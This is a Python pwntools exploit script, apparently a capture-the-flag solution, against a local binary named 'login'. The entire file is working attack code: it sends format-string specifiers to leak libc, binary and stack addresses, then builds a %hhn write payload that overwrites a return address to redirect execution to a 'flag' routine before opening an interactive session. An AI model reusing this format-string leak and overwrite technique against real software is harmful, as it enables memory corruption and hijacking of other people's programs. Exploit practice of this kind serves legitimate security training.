#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./login')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r.recvuntil('Login: ')
r.sendline('guest')
r.recvuntil('Password: ')
r.sendline('guest123')

def cmd(x):
    r.recvuntil('Your choice: ')
    r.sendline(str(x))

def show():
    cmd(1)

def login(s):
    cmd(2)
    r.recvuntil('username:\n')
    r.sendline(s)

login('\x00'*256)

cmd(4)
r.recvuntil('Login: ')
r.sendline('%23$p.%24$p.%42$p.')
r.recvuntil('Password: ')
r.sendline('a')

libc_base = int(r.recvuntil('.')[:-1],16) - libc.symbols['_IO_2_1_stdin_']
log.info('libc_base : {}'.format(hex(libc_base)))
binary_base = int(r.recvuntil('.')[:-1],16) - 0xba0
log.info('binary_base : {}'.format(hex(binary_base)))
leak_stack = int(r.recvuntil('.')[:-1],16) 
log.info('leak_stack : {}'.format(hex(leak_stack)))

print_ret = leak_stack - 0x138
flag = binary_base + 0xfb3

a = flag & 0xff
b = (flag >> 8) & 0xff

payload = '%{}c%40$hhn%{}c%41$hhn'.format(a, (b - a) & 0xff)

r.recvuntil('Login: ')
r.sendline(payload)
r.recvuntil('Password: ')
raw_input('#')
r.sendline(p64(print_ret) + p64(print_ret + 1))









r.interactive()
